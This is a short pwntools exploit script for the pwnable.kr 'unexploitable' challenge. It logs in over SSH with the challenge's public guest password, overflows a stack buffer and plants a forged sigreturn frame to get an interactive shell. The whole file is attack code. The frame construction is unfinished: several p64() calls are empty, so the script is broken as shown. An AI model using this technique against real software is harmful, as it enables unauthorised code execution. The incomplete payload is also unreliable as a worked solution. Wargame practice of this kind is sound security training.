#!/usr/bin/env python3
from pwn import *
from sys import argv
binary = ELF('unexploitable', checksec=0)
#libc = ELF()
if len(argv) >= 2 and argv[1] == '-r':
  s = ssh(user='unexploitable', host='pwnable.kr', port=2222, password='guest')
  p = s.process("/home/unexploitable/unexploitable")
else:
  p = binary.process(env={})
s = lambda x, r="" : \
  p.sendafter(r, x) if r else p.send(x)
sl = lambda x, r="" : \
  p.sendlineafter(r, x) if r else p.sendline(x)

sigframe = p64(0x00400430) # pretcode
sigframe += p64(0x0000000000400560) # syscall
sigframe += p64(7) # uc_flags
sigframe += p64(0) # uc_link
sigframe += p64(0) # uc_stack.ss_sp
sigframe += p64(0x0000ffff00000000) # uc_stack.ss_flags
sigframe += p64(0) # uc_stack.ss_size
sigframe += p64(0xdeadbeefcafebabe) * 8 # r8-r15
sigframe += p64(1) # rdi
sigframe += p64()
sigframe += p64()
sigframe += p64()
sigframe += p64()
sigframe += p64()

offset=24
payload=b'A'*offset
payload+=sigframe

pause()
p.sendline(payload)
p.interactive()

